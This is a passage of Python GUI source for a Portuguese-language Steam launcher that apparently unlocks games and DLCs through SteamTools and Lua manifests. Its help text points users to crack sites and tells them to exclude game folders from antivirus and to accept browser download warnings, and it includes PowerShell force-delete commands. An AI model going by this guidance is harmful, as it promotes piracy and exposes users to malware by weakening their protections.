   • Senha para extrair o fix (veja na página)

4. Baixe e extraia TODOS os arquivos na pasta do jogo
   Onde fica? Steam > Biblioteca > Clique direito no jogo > Gerenciar > Explorar arquivos locais

5. Substitua tudo que pedir

6. Inicie o jogo com a Steam aberta e divirta-se!

❓ DÚVIDAS FREQUENTES:

• Várias opções de download? Qualquer botão azul leva ao mesmo fix

• Página estranha ao clicar? Use bloqueador de propaganda

• Não achei o jogo? Infelizmente não dá pra jogar online

• Aparece "Spacewar"? É normal, assim que o online-fix funciona

• Amigo tem o jogo original? Sim, peça para ele usar o mesmo fix

• Senha? Dê uma olhada na página do fix do jogo

• Não vejo os botões? Verifique se está logado no site"""

        lbl_online = ctk.CTkTextbox(
            scroll_online,
            font=ctk.CTkFont(size=12),
            fg_color=CORES["fundo_escuro"],
            text_color=CORES["texto"],
            wrap="word",
            height=380,
        )
        lbl_online.pack(fill="both", expand=True, pady=(0, 12))
        lbl_online.insert("1.0", txt_online)
        lbl_online.configure(state="disabled")

        btn_online = ctk.CTkButton(
            scroll_online,
            text="🌐 Abrir online-fix.me",
            font=ctk.CTkFont(size=13, weight="bold"),
            height=40,
            fg_color=CORES["botao_azul"],
            hover_color=CORES["botao_azul_hover"],
            text_color="white",
            command=lambda: os.startfile("https://online-fix.me/"),
        )
        btn_online.pack(fill="x", pady=(0, 8))

        # === ABA FIX DO JOGO ===
        txt_fix = """🛠️ MEU JOGO PRECISA DE UM FIX, ONDE EU ENCONTRO?

1. Acesse: https://generator.ryuu.lol/fixes
   • Busque pelo nome do jogo ou pelo App ID
   • Onde fica o App ID? Na página do jogo, olhe no link.
     Ex: store.steampowered.com/app/1159690/Voidtrain/ → App ID = 1159690
   • O site não abre? Use VPN.
   • Não tem seu fix? Procure em comunidades de jogos ou sites especializados.
   • Ainda não achou? Baixe o jogo completo de algum site confiável.

2. Baixe o fix e extraia.
3. Copie todos os arquivos para a pasta do jogo.

   Onde fica a pasta?
   Biblioteca > Clique direito no jogo > Gerenciar > Explorar Arquivos Locais

4. Substitua tudo, caso pergunte.
5. Inicie o jogo pela Steam.
   • Não funcionou? Inicie pela pasta do jogo.
   • Execute o aplicativo/executável que veio com o fix.
6. Pronto! 🎉

🤔 TIRANDO DÚVIDAS:

• Não tem fix pro meu jogo?
  Comunidades de jogos compartilham fixes em fóruns e sites especializados.
  Procure por: nome do jogo + "fix" ou "crack".

• Como faço o antivírus não apagar o fix?
  Adicione a pasta do jogo na exclusão do antivírus.
  Pesquise no YouTube: "Como adicionar exclusão no antivírus Windows".

• Meu navegador disse que é perigoso, devo me preocupar?
  Não. É normal, o fix só engana o jogo.
  Pesquise como permitir download de arquivos "suspeitos" no seu navegador.

• Coloquei o fix na pasta, mas nada mudou?
  Confira se extraiu o fix corretamente.
  Ou tente iniciar pelo executável da pasta do jogo."""

        scroll_fix = ctk.CTkScrollableFrame(tab_fix, fg_color="transparent")
        scroll_fix.pack(fill="both", expand=True, padx=12, pady=12)
        lbl_fix = ctk.CTkTextbox(scroll_fix, font=ctk.CTkFont(size=12), fg_color=CORES["fundo_escuro"],
                                 text_color=CORES["texto"], wrap="word", height=380)
        lbl_fix.pack(fill="both", expand=True, pady=(0, 12))
        lbl_fix.insert("1.0", txt_fix)
        lbl_fix.configure(state="disabled")
        ctk.CTkButton(scroll_fix, text="🌐 Abrir generator.ryuu.lol/fixes", font=ctk.CTkFont(size=13, weight="bold"),
                      height=40, fg_color=CORES["botao_azul"], hover_color=CORES["botao_azul_hover"],
                      text_color="white", command=lambda: os.startfile("https://generator.ryuu.lol/fixes")).pack(fill="x", pady=(0, 8))

        # === ABA STEAM NÃO ABRE ===
        txt_steam = """⚠️ MINHA STEAM NÃO ABRE, O QUE EU FAÇO?

Solução 1: Reinicie o computador e tente abrir a Steam novamente.

Solução 2: Abra o PowerShell como administrador e execute:

Get-Process steam -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Process -FilePath (Join-Path ((Get-ItemProperty "HKLM:\\SOFTWARE\\WOW6432Node\\Valve\\Steam").InstallPath) "Steam.exe") -ArgumentList "-dev"

Aguarde a Steam abrir.

Solução 3: Remover Millennium (se instalado anteriormente):

No PowerShell como admin:
$s = (Get-ItemProperty "HKLM:\\SOFTWARE\\WOW6432Node\\Valve\\Steam").InstallPath
Remove-Item "$s\\millennium.dll" -Force -ErrorAction SilentlyContinue
Remove-Item "$s\\python311.dll" -Force -ErrorAction SilentlyContinue
Remove-Item "$s\\ext" -Recurse -Force -ErrorAction SilentlyContinue
Start-Process "$s\\steam.exe"

Solução 4: Arquivos .lua com problema?

Se os arquivos .lua parecem corrompidos ou incorretos:
• Remova o .lua do jogo na pasta Steam\\config\\stplug-in
• Reinstale o jogo pelo launcher
• Ou baixe um novo .lua em steamtools.site ou manifestlua.blog

A Steam ainda não abre?

• Atualize a Steam
• Reinstale o SteamTools (use a aba Desinstalar e depois reinicie o launcher)
• Tente iniciar a Steam com modo desenvolvedor: steam.exe -dev"""

        scroll_steam = ctk.CTkScrollableFrame(tab_steam, fg_color="transparent")
        scroll_steam.pack(fill="both", expand=True, padx=12, pady=12)
        lbl_steam = ctk.CTkTextbox(scroll_steam, font=ctk.CTkFont(size=12), fg_color=CORES["fundo_escuro"],
                                   text_color=CORES["texto"], wrap="word", height=380)
        lbl_steam.pack(fill="both", expand=True, pady=(0, 12))
        lbl_steam.insert("1.0", txt_steam)
        lbl_steam.configure(state="disabled")
        ctk.CTkButton(scroll_steam, text="↻ Reiniciar Steam", font=ctk.CTkFont(size=13, weight="bold"), height=40,
                      fg_color=CORES["botao_azul"], hover_color=CORES["botao_azul_hover"], text_color="white",
                      command=lambda: (self.tabview.set("Instalar"), self._on_restart())).pack(fill="x", pady=(0, 8))

        # === ABA DESINSTALAR ===
        scroll_desinstalar = ctk.CTkScrollableFrame(tab_desinstalar, fg_color="transparent")
        scroll_desinstalar.pack(fill="both", expand=True, padx=12, pady=12)

        txt_desinstalar = """🗑️ COMO DESINSTALAR O STEAMTOOLS

━━━ Opção 1: Remover só o SteamTools ━━━
Remove o SteamTools mas mantém a Steam e seus jogos.

Clique no botão "Desinstalar tudo" abaixo, ou manualmente:
Na pasta da Steam, exclua:
   • arquivo xinput1_4.dll
   • pasta config\\stplug-in (arquivos .lua dos jogos)
   • pasta config\\depotcache (arquivos .manifest)

━━━ Opção 2: Reinstalar a Steam do zero ━━━
A biblioteca e os jogos também serão removidos!

1. Desinstale a Steam pelo Windows
2. Exclua a pasta da Steam (geralmente: C:\\Program Files (x86)\\Steam)
3. Reinicie o computador
4. Instale a Steam novamente: https://store.steampowered.com/about/

━━━ Se tiver Millennium instalado ━━━
No PowerShell como admin:
$s = (Get-ItemProperty "HKLM:\\SOFTWARE\\WOW6432Node\\Valve\\Steam").InstallPath
Remove-Item "$s\\millennium.dll" -Force -ErrorAction SilentlyContinue
Remove-Item "$s\\python311.dll" -Force -ErrorAction SilentlyContinue
Remove-Item "$s\\ext" -Recurse -Force -ErrorAction SilentlyContinue"""

        lbl_desinstalar = ctk.CTkTextbox(
            scroll_desinstalar,
            font=ctk.CTkFont(size=12),
            fg_color=CORES["fundo_escuro"],
            text_color=CORES["texto"],
            wrap="word",
            height=320,
        )
        lbl_desinstalar.pack(fill="both", expand=True, pady=(0, 12))
        lbl_desinstalar.insert("1.0", txt_desinstalar)
        lbl_desinstalar.configure(state="disabled")

        ctk.CTkLabel(scroll_desinstalar, text="Remoção completa (SteamTools + Millennium + LuaTools):",
                     font=ctk.CTkFont(size=12, weight="bold"), text_color=CORES["texto"]).pack(anchor="w", pady=(8, 4))
        btn_desinstalar = ctk.CTkButton(
            scroll_desinstalar,
            text="🗑 Desinstalar tudo",
            font=ctk.CTkFont(size=13, weight="bold"),
            height=40,
            fg_color=CORES["botao_azul"],
            hover_color=CORES["botao_azul_hover"],
            text_color="white",
            command=self._on_desinstalar,
        )
        btn_desinstalar.pack(fill="x", pady=(0, 8))
        ctk.CTkLabel(scroll_desinstalar, text="Remove SteamTools, Millennium, LuaTools e jogos da biblioteca. A Steam será fechada.",
                     font=ctk.CTkFont(size=11), text_color=CORES["texto_secundario"]).pack(anchor="w")

        ctk.CTkButton(
            scroll_desinstalar,
            text="📥 Abrir site do Millennium",
            font=ctk.CTkFont(size=12),
            height=36,
            fg_color=CORES["botao_azul"],
            hover_color=CORES["botao_azul_hover"],
            text_color="white",
            command=lambda: os.startfile("https://docs.steambrew.app/users/getting-started/installation"),
        ).pack(fill="x", pady=(12, 0))

        # Rodapé JP. Sistemas
        footer = ctk.CTkLabel(
            self,
            text="jp-sistemas.com · Tecnologia em Gestão",
            font=ctk.CTkFont(size=10),
            text_color=CORES["texto_secundario"],
            cursor="hand2",
        )
        footer.pack(pady=(0, 12))
        footer.bind("<Button-1>", lambda e: os.startfile("https://jp-sistemas.com/"))

    def _get_app_id(self):
        return extract_app_id(self.entry_appid.get())

    def _on_card_click(self, app_id):
        """Clica no card do jogo: define App ID e instala."""
        self.entry_appid.delete(0, "end")
        self.entry_appid.insert(0, str(app_id))
        self.tabview.set("Instalar")
        self._on_install()

    def _limpar_busca(self):
        """Limpa o campo de busca e volta para a tela inicial."""
        self.entry_busca.delete(0, "end")
        self._filtrar_jogos()

    def _atualizar_lista(self):
        """Botão para forçar atualização da lista de jogos."""
        self.btn_atualizar_lista.configure(text="Atualizando...", state="disabled")
        for w in self.scroll_jogos.winfo_children():
            w.destroy()
        lbl = ctk.CTkLabel(self.scroll_jogos, text="Baixando lista atualizada...",
                           font=ctk.CTkFont(size=14), text_color=CORES["texto_secundario"])
        lbl.pack(pady=40)
        cache_path = os.path.join(tempfile.gettempdir(), "jp_steam_gamelist.json")
        if os.path.exists(cache_path):
            try:
                os.remove(cache_path)
            except Exception:
                pass
        threading.Thread(target=self._carregar_gamelist, daemon=True).start()

    def _carregar_gamelist(self):
        """Baixa e processa a lista de jogos do SteamTools GameList."""
        cache_path = os.path.join(tempfile.gettempdir(), "jp_steam_gamelist.json")
        data = None
        try:
            req = urllib.request.Request(GAMELIST_URL, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=60) as r:
                data = json.load(r)
            with open(cache_path, "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False)
        except Exception:
            if os.path.exists(cache_path):
                try:
                    with open(cache_path, "r", encoding="utf-8") as f:
                        data = json.load(f)
                except Exception:
                    pass
        try:
            if data:
                games = [g for g in data if g.get("type") == "game" and g.get("appid") and g.get("name")]
                self.after(0, lambda: self._on_gamelist_loaded(games))
            else:
                self.after(0, lambda: self._on_gamelist_error("Sem conexão e sem cache local"))
        except Exception as e:
            self.after(0, lambda: self._on_gamelist_error(str(e)))

    def _on_gamelist_loaded(self, games):
        self._games_data = games
        try:
            self.lbl_carregando.destroy()
        except Exception:
            pass
        self.btn_atualizar_lista.configure(text="↻ Atualizar lista", state="normal")
        self._filtrar_jogos()

    def _on_gamelist_error(self, err):
        self._games_data = [{"appid": str(a), "name": n, "tags": []} for a, n in JOGOS_FALLBACK]
        try:
            self.lbl_carregando.destroy()
        except Exception:
            pass
        self.btn_atualizar_lista.configure(text="↻ Atualizar lista", state="normal")
        self._filtrar_jogos()

    def _get_recent_games(self, limit=20):
        """Retorna os últimos jogos adicionados à base, ordenados do mais recente."""
        com_data = []
        for g in self._games_data:
            added = g.get("added_date", "")
            if not added:
                continue
            try:
                dt = datetime.fromisoformat(added)
                com_data.append((str(g["appid"]), g["name"], dt))
            except Exception:
                continue
        com_data.sort(key=lambda x: x[2], reverse=True)
        return [(appid, nome) for appid, nome, _ in com_data[:limit]]

    def _buscar_steam_api(self, app_id):
        """Busca info de um jogo na Steam Store API por App ID. Retorna (app_id, nome) ou None."""
        try:
            url = f"https://store.steampowered.com/api/appdetails?appids={app_id}"
            req = urllib.request.Request(url, headers={"User-Agent": "JP-Steam-Launcher/1.0"})
            with urllib.request.urlopen(req, timeout=10) as r:
                data = json.loads(r.read().decode())
            info = data.get(str(app_id), {})
            if info.get("success"):
                game_data = info["data"]
                nome = game_data.get("name", f"App {app_id}")
                header_img = game_data.get("header_image", "")
                if header_img:
                    self._api_img_urls[str(app_id)] = header_img
                return (str(app_id), nome)
        except Exception:
            pass
        return None

    def _buscar_steam_por_nome(self, termo):
        """Busca jogos na Steam Store Search API por nome. Retorna lista de (app_id, nome)."""
        try:
            encoded = urllib.parse.quote(termo)
            url = f"https://store.steampowered.com/api/storesearch/?term={encoded}&l=portuguese&cc=BR"
            req = urllib.request.Request(url, headers={"User-Agent": "JP-Steam-Launcher/1.0"})
            with urllib.request.urlopen(req, timeout=10) as r:
                data = json.loads(r.read().decode())
            items = data.get("items", [])
            resultados = []
            for item in items[:20]:
                aid = str(item.get("id", ""))
                nome = item.get("name", "")
                if aid and nome:
                    resultados.append((aid, nome))
                    tiny = item.get("tiny_image", "")
                    if tiny:
                        self._api_img_urls[aid] = tiny
            return resultados
        except Exception:
            pass
        return []

    def _filtrar_jogos(self):
        """Sem busca: mostra recém adicionados + populares. Com busca: filtra por link/ID/nome."""
        busca = (self.entry_busca.get().strip() if hasattr(self, 'entry_busca') else "") or ""
        appid_extraido = extract_app_id(busca)
        if appid_extraido:
            busca = appid_extraido
        busca_lower = busca.lower()
        games_by_appid = {str(g.get("appid", "")): (str(g["appid"]), g["name"]) for g in self._games_data if g.get("appid") and g.get("name")}

        if not busca:
            recentes = self._get_recent_games()
            populares = []
            recentes_ids = {r[0] for r in recentes}
            for aid in POPULAR_APPIDS:
                aid_str = str(aid)
                if aid_str in games_by_appid and aid_str not in recentes_ids:
                    populares.append(games_by_appid[aid_str])
            total_base = len(self._games_data)
            secoes = []
            if recentes:
                secoes.append((f"Últimos adicionados ({len(recentes)})", recentes))
            secoes.append((f"Mais populares ({len(populares)})", populares))
            txt_total = f"{total_base} jogos na base (busque para ver todos)"
            self.lbl_total.configure(text=txt_total)
            self._build_game_sections(secoes)
        else:
            filtrados = []
            for appid_str, (_, nome) in games_by_appid.items():
                if busca in appid_str or busca_lower in nome.lower():
                    filtrados.append((appid_str, nome))

            # Se não achou na lista local, tenta na Steam API
            if not filtrados:
                self.lbl_total.configure(text="Buscando na Steam...")
                self.update_idletasks()
                if busca.isdigit():
                    resultado_api = self._buscar_steam_api(busca)
                    if resultado_api:
                        filtrados.append(resultado_api)
                else:
                    resultados_nome = self._buscar_steam_por_nome(busca)
                    if resultados_nome:
                        filtrados.extend(resultados_nome)

            total = len(filtrados)
            total_base = len(self._games_data)
            txt_total = f"Total: {total} jogos"
            if total_base != total:
                txt_total += f" (de {total_base} na base)"
            self.lbl_total.configure(text=txt_total)
            jogos_exibir = filtrados[:MAX_CARDS_VISIVEIS]
            self._build_game_sections([("Resultados", jogos_exibir)],
                                      limit_msg=f"Mostrando {len(jogos_exibir)} de {total}. Refine a busca." if total > MAX_CARDS_VISIVEIS else None)

    def _build_game_sections(self, secoes, limit_msg=None):
        """Renderiza múltiplas seções de jogos com cabeçalhos."""
        for w in self.scroll_jogos.winfo_children():
            w.destroy()

        total_jogos = sum(len(jogos) for _, jogos in secoes)
        if total_jogos == 0:
            ctk.CTkLabel(self.scroll_jogos, text="Nenhum jogo encontrado. Cole o link da Steam ou digite nome/ID e clique em Buscar.",
                         font=ctk.CTkFont(size=13), text_color=CORES["texto_secundario"]).pack(pady=40)
            return

        row_offset = 0
        if limit_msg:
            lbl_info = ctk.CTkLabel(self.scroll_jogos, text=limit_msg,
                                    font=ctk.CTkFont(size=11), text_color=CORES["texto_secundario"])
            lbl_info.grid(row=0, column=0, columnspan=4, pady=(0, 8), sticky="w")
            row_offset = 1

        first_section = True
        for titulo, jogos in secoes:
            if not jogos:
                continue
            if not first_section:
                sep = ctk.CTkFrame(self.scroll_jogos, fg_color=CORES["borda"], height=1)
                sep.grid(row=row_offset, column=0, columnspan=4, sticky="ew", padx=4, pady=(8, 0))
                row_offset += 1
            first_section = False

            lbl_secao = ctk.CTkLabel(self.scroll_jogos, text=titulo,
                                     font=ctk.CTkFont(size=14, weight="bold"),
                                     text_color=CORES["accent"])
            lbl_secao.grid(row=row_offset, column=0, columnspan=4, pady=(12, 4), padx=4, sticky="w")
            row_offset += 1

            for i, (app_id, nome) in enumerate(jogos):
                row, col = row_offset + i // 4, i % 4
                self._create_game_card(app_id, nome, row, col)
            row_offset += (len(jogos) + 3) // 4

    def _create_game_card(self, app_id, nome, row, col):
        """Cria um card de jogo na posição (row, col) do scroll_jogos."""
        card_jogo = ctk.CTkFrame(self.scroll_jogos, fg_color=CORES["fundo_card"], corner_radius=10,
                                 border_width=1, border_color=CORES["borda"], width=160, height=200,
                                 cursor="hand2")
        card_jogo.grid(row=row, column=col, padx=8, pady=8, sticky="nsew")
        card_jogo.grid_propagate(False)

        def _on_enter(e):
            card_jogo.configure(fg_color=CORES["card_hover"], border_color=CORES["botao_azul"])
        def _on_leave(e):
            card_jogo.configure(fg_color=CORES["fundo_card"], border_color=CORES["borda"])

        img_frame = ctk.CTkFrame(card_jogo, fg_color=CORES["fundo_escuro"], height=90, corner_radius=6)
        img_frame.pack(fill="x", padx=6, pady=(6, 4))
        img_frame.pack_propagate(False)
        lbl_img = ctk.CTkLabel(img_frame, text="...", font=ctk.CTkFont(size=10),
                               text_color=CORES["texto_secundario"], fg_color="transparent")
        lbl_img.pack(fill="both", expand=True)
        lbl_nome = ctk.CTkLabel(card_jogo, text=nome[:22] + ("..." if len(nome) > 22 else ""),
                                font=ctk.CTkFont(size=11), text_color=CORES["texto"], wraplength=140)
        lbl_nome.pack(fill="x", padx=6, pady=2)
        lbl_id = ctk.CTkLabel(card_jogo, text=f"ID: {app_id}", font=ctk.CTkFont(size=10),
                              text_color=CORES["texto_secundario"])
        lbl_id.pack(fill="x", padx=6, pady=(0, 6))

        def _click(e, aid=app_id):
            self._on_card_click(aid)
        card_jogo.bind("<Button-1>", _click)
        card_jogo.bind("<Enter>", _on_enter)
        card_jogo.bind("<Leave>", _on_leave)
        for w in (lbl_img, lbl_nome, lbl_id, img_frame):
            w.bind("<Button-1>", _click)
        self._load_game_image(app_id, lbl_img)

    def _load_game_image(self, app_id, lbl):
        """Carrega imagem do jogo da Steam CDN em background, com cache em disco e fallbacks."""
        def worker():
            try:
                if app_id in self._cache_imgs:
                    img = self._cache_imgs[app_id]
                else:
                    if not PILImage:
                        return
                    path = os.path.join(tempfile.gettempdir(), f"jp_steam_{app_id}.jpg")
                    if not os.path.exists(path) or os.path.getsize(path) < 100:
                        urls = [
                            f"https://cdn.cloudflare.steamstatic.com/steam/apps/{app_id}/header.jpg",
                            f"https://cdn.akamai.steamstatic.com/steam/apps/{app_id}/header.jpg",
                            f"https://steamcdn-a.akamaihd.net/steam/apps/{app_id}/header.jpg",
                        ]
                        api_url = self._api_img_urls.get(app_id)
                        if api_url:
                            urls.insert(0, api_url)
                        downloaded = False
                        for url in urls:
                            try:
                                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                                with urllib.request.urlopen(req, timeout=8) as r:
                                    data = r.read()
                                    if len(data) > 100:
                                        with open(path, "wb") as f:
                                            f.write(data)
                                        downloaded = True
                                        break
                            except Exception:
                                continue
                        if not downloaded:
                            return
                    _lanczos = getattr(PILImage, "Resampling", PILImage).LANCZOS if hasattr(PILImage, "Resampling") else PILImage.LANCZOS
                    img = PILImage.open(path).convert("RGBA").resize((148, 70), _lanczos)
                    self._cache_imgs[app_id] = img
                self.after(0, lambda: self._set_card_image(lbl, img))
            except Exception:
                pass
        threading.Thread(target=worker, daemon=True).start()

    def _set_card_image(self, lbl, pil_img):
        try:
            ctk_img = ctk.CTkImage(light_image=pil_img, dark_image=pil_img, size=(148, 70))
            lbl.configure(image=ctk_img, text="")
        except Exception:
            pass

    def _log(self, msg, level="info"):
        self.log_text.insert("end", f"• {msg}\n", level)
        self.log_text.see("end")
        self.update_idletasks()

    def _set_buttons_state(self, disabled):
        state = "disabled" if disabled else "normal"
        for btn in (self.btn_install, self.btn_remove, self.btn_restart):
            btn.configure(state=state)

    def _on_install(self):
        app_id = self._get_app_id()
        if not app_id:
            self._log("Link ou App ID inválido. Cole a URL da Steam ou o número.", "erro")
            return

        self._set_buttons_state(True)
        self.btn_install.configure(text="Buscando DLCs...")
        self.log_text.delete("1.0", "end")
        self._log(f"App ID: {app_id}")
        self._log("Verificando DLCs disponíveis...", "info")

        def check_dlcs():
            dlcs = fetch_dlcs(app_id)
            self.after(0, lambda: self._show_dlc_dialog(app_id, dlcs))

        threading.Thread(target=check_dlcs, daemon=True).start()

    def _show_dlc_dialog(self, app_id, dlcs):
        if not dlcs:
            self._log("Nenhuma DLC encontrada. Instalando jogo...", "info")
            self._do_install([app_id])
            return

        dlg = ctk.CTkToplevel(self)
        dlg.title(f"DLCs do jogo {app_id}")
        dlg.geometry("500x450")
        dlg.transient(self)
        dlg.grab_set()
        dlg.configure(fg_color=CORES["fundo_escuro"])

        ctk.CTkLabel(dlg, text=f"DLCs encontradas: {len(dlcs)}", font=ctk.CTkFont(size=16, weight="bold"),
                     text_color=CORES["texto"]).pack(pady=(16, 4))
        ctk.CTkLabel(dlg, text="Selecione as DLCs para instalar junto com o jogo:",
                     font=ctk.CTkFont(size=12), text_color=CORES["texto_secundario"]).pack(pady=(0, 12))

        scroll = ctk.CTkScrollableFrame(dlg, fg_color=CORES["fundo_card"], height=260)
        scroll.pack(fill="both", expand=True, padx=16, pady=(0, 12))

        dlc_vars = {}
        for dlc_id, nome in dlcs:
            var = ctk.BooleanVar(value=True)
            dlc_vars[dlc_id] = var
            ctk.CTkCheckBox(scroll, text=f"{nome} ({dlc_id})", variable=var,
                           font=ctk.CTkFont(size=12), text_color=CORES["texto"],
                           fg_color=CORES["botao_azul"], hover_color=CORES["botao_azul_hover"],
                           ).pack(anchor="w", pady=2, padx=8)

        btn_frame = ctk.CTkFrame(dlg, fg_color="transparent")
        btn_frame.pack(pady=(0, 16))

        def _select_all():
            for v in dlc_vars.values():
                v.set(True)

        def _deselect_all():
            for v in dlc_vars.values():
                v.set(False)

        def _install():
            ids = [app_id]
            for dlc_id, var in dlc_vars.items():
                if var.get():
                    ids.append(dlc_id)
            dlg.grab_release()
            dlg.destroy()
            self._do_install(ids)

        def _skip():
            dlg.grab_release()
            dlg.destroy()
            self._do_install([app_id])

        ctk.CTkButton(btn_frame, text="Selecionar todas", command=_select_all, width=130, height=32,
                     fg_color=CORES["fundo_card"], text_color=CORES["texto"]).pack(side="left", padx=4)
        ctk.CTkButton(btn_frame, text="Desmarcar todas", command=_deselect_all, width=130, height=32,
                     fg_color=CORES["fundo_card"], text_color=CORES["texto"]).pack(side="left", padx=4)

        btn_frame2 = ctk.CTkFrame(dlg, fg_color="transparent")
        btn_frame2.pack(pady=(0, 16))
        ctk.CTkButton(btn_frame2, text="Instalar selecionadas", command=_install, width=180, height=38,
                     fg_color=CORES["botao_azul"], hover_color=CORES["botao_azul_hover"],
                     text_color="white", font=ctk.CTkFont(size=13, weight="bold")).pack(side="left", padx=4)
        ctk.CTkButton(btn_frame2, text="Só o jogo", command=_skip, width=100, height=38,
                     fg_color=CORES["fundo_card"], text_color=CORES["texto"]).pack(side="left", padx=4)

    def _do_install(self, app_ids):
        """Instala uma lista de app IDs (jogo + DLCs)."""
        self.btn_install.configure(text="Processando...")

        def worker():
            try:
                close_steam()
                steam_path = None
                total = len(app_ids)
                for i, aid in enumerate(app_ids, 1):
                    self.after(0, lambda a=aid, n=i, t=total: self._log(f"[{n}/{t}] Instalando {a}...", "info"))
                    success, result = download_game_files(aid, self._log)
                    if success:
                        steam_path = result
                    else:
                        self.after(0, lambda a=aid, r=result: self._log(f"Falha no {a}: {r}", "erro"))
                if steam_path:
                    self.after(0, lambda: self._finish_install(True, steam_path, app_ids[0]))
                else:
                    self.after(0, lambda: self._finish_install(False, "Nenhum arquivo encontrado", app_ids[0]))
            except Exception as e:
                self.after(0, lambda: self._finish_install(False, str(e), app_ids[0]))

        threading.Thread(target=worker, daemon=True).start()

    def _finish_install(self, success, steam_path_or_error, app_id):
        self._set_buttons_state(False)
        self.btn_install.configure(text="▶  Instalar jogo")

        if success and isinstance(steam_path_or_error, str):
            steam_exe = os.path.join(steam_path_or_error, "steam.exe")
            self._log("Reiniciando Steam...", "ok")
            subprocess.Popen([steam_exe, "-clearbeta"], creationflags=subprocess.CREATE_NO_WINDOW)
            self._log("Pronto! O jogo e DLCs devem aparecer na biblioteca.", "ok")
        else:
            self._log(f"Falha: {steam_path_or_error}", "erro")
            self._log("Tente: steamtools.site ou manifestlua.blog", "info")

    def _on_remove(self):
        app_id = self._get_app_id()
        if not app_id:
            self._log("Link ou App ID inválido. Cole a URL da Steam ou o número.", "erro")
            return

        self._set_buttons_state(True)
        self.btn_remove.configure(text="Removendo...")
        self.log_text.delete("1.0", "end")
        self._log(f"Removendo App ID: {app_id}")

        def worker():
            try:
                close_steam()
                success, result = remove_game_files(app_id, self._log)
                self.after(0, lambda: self._finish_remove(success, result, app_id))
            except Exception as e:
                self.after(0, lambda: self._finish_remove(False, str(e), app_id))

        threading.Thread(target=worker, daemon=True).start()

    def _finish_remove(self, success, steam_path_or_error, app_id):
        self._set_buttons_state(False)
        self.btn_remove.configure(text="🗑  Remover jogo")

        if success and isinstance(steam_path_or_error, str):
            steam_exe = os.path.join(steam_path_or_error, "steam.exe")
            subprocess.Popen([steam_exe, "-clearbeta"], creationflags=subprocess.CREATE_NO_WINDOW)
            self._log("Jogo removido. Steam reiniciada.", "ok")
        else:
            self._log(f"Falha: {steam_path_or_error}", "erro")

    def _on_restart(self):
        self._set_buttons_state(True)
        self.btn_restart.configure(text="Reiniciando...")
        self.log_text.delete("1.0", "end")

        def worker():
            try:
                success, result = restart_steam(self._log)
                self.after(0, lambda: self._finish_restart(success, result))
            except Exception as e:
                self.after(0, lambda: self._finish_restart(False, str(e)))

        threading.Thread(target=worker, daemon=True).start()

    def _finish_restart(self, success, result):
        self._set_buttons_state(False)
        self.btn_restart.configure(text="↻  Reiniciar Steam")
        if not success:
            self._log(f"Falha: {result}", "erro")

    def _on_desinstalar(self):
        """Desinstala SteamTools e Millennium (remove xinput1_4.dll e pasta ext)."""
        dlg = ctk.CTkToplevel(self)
        dlg.title("Confirmar desinstalação")
        dlg.geometry("400x140")
        dlg.transient(self)
        dlg.grab_set()
        dlg.configure(fg_color=CORES["fundo_escuro"])
        ctk.CTkLabel(dlg, text="Remover TUDO?\n\nSteamTools, Millennium, LuaTools e jogos da biblioteca serão removidos.",
                     font=ctk.CTkFont(size=13), text_color=CORES["texto"], wraplength=360).pack(pady=20, padx=20)
        btn_frame = ctk.CTkFrame(dlg, fg_color="transparent")
        btn_frame.pack(pady=(0, 20))

        def _confirmar():
            dlg.grab_release()
            dlg.destroy()
            self.tabview.set("Instalar")
            self.log_text.delete("1.0", "end")
            self._log("Desinstalando tudo (SteamTools, Millennium, LuaTools)...", "info")
            success, result = uninstall_tudo(self._log)
            if success:
                self._log("Removido com sucesso.", "ok")
                steam_exe = os.path.join(result, "steam.exe")
                if os.path.exists(steam_exe):
                    subprocess.Popen([steam_exe, "-clearbeta"], creationflags=subprocess.CREATE_NO_WINDOW)
            else:
                self._log(f"Falha: {result}", "erro")

        ctk.CTkButton(btn_frame, text="Sim, desinstalar", command=_confirmar,
                     fg_color=CORES["botao_azul"], hover_color=CORES["botao_azul_hover"], text_color="white").pack(side="left", padx=4)
        ctk.CTkButton(btn_frame, text="Cancelar", command=lambda: (dlg.grab_release(), dlg.destroy()),
                     fg_color=CORES["botao_azul"], hover_color=CORES["botao_azul_hover"], text_color="white").pack(side="left", padx=4)


def _show_license_dialog():
    """Mostra diálogo de ativação. Retorna True se válido, False para sair."""
    hw_id = get_hardware_id()
    stored = load_stored_key()

    root = ctk.CTk()
    root.title("JP Steam Launcher - Ativação")
    root.geometry("440x260")
    root.resizable(False, False)
    root.configure(fg_color=CORES["fundo_escuro"])
    root.eval("tk::PlaceWindow . center")

    result = [None]

    ctk.CTkLabel(root, text="Ativação necessária", font=ctk.CTkFont(size=18, weight="bold"),
                 text_color=CORES["texto"]).pack(pady=(24, 8))
    ctk.CTkLabel(root, text="1 key = 1 PC. Digite sua key para continuar.",
                 font=ctk.CTkFont(size=12), text_color=CORES["texto_secundario"]).pack(pady=(0, 16))

    entry_key = ctk.CTkEntry(root, placeholder_text="XXXX-XXXX-XXXX", width=280, height=40,
                             font=ctk.CTkFont(size=14))
    entry_key.pack(pady=(0, 8))
    if stored:
        entry_key.insert(0, stored)

    lbl_status = ctk.CTkLabel(root, text="", font=ctk.CTkFont(size=11), text_color=CORES["erro"])
    lbl_status.pack(pady=(0, 12))

    def _on_ativar():
        key = entry_key.get().strip()
        if not key:
            lbl_status.configure(text="Digite a key")
            return
        lbl_status.configure(text="Validando...", text_color=CORES["texto_secundario"])
        root.update()

        def _worker():
            ok, msg = validate_license(key, hw_id)
            root.after(0, lambda: _finish(ok, msg, key))

        threading.Thread(target=_worker, daemon=True).start()

    def _finish(ok, msg, key):
        if ok:
            save_key(key)
            result[0] = True
            root.destroy()
        else:
            lbl_status.configure(text=msg, text_color=CORES["erro"])

    def _on_sair():
        result[0] = False
        root.destroy()

    btn_frame = ctk.CTkFrame(root, fg_color="transparent")
    btn_frame.pack(pady=(0, 20))
    ctk.CTkButton(btn_frame, text="Ativar", command=_on_ativar, width=120, height=36,
                 fg_color=CORES["botao_azul"], hover_color=CORES["botao_azul_hover"],
                 text_color="white").pack(side="left", padx=8)
    ctk.CTkButton(btn_frame, text="Sair", command=_on_sair, width=100, height=36,
                 fg_color=CORES["fundo_card"], text_color=CORES["texto"]).pack(side="left")

    root.mainloop()
    return result[0] is True


def _get_own_hash():
    """Retorna SHA256 do EXE atual."""
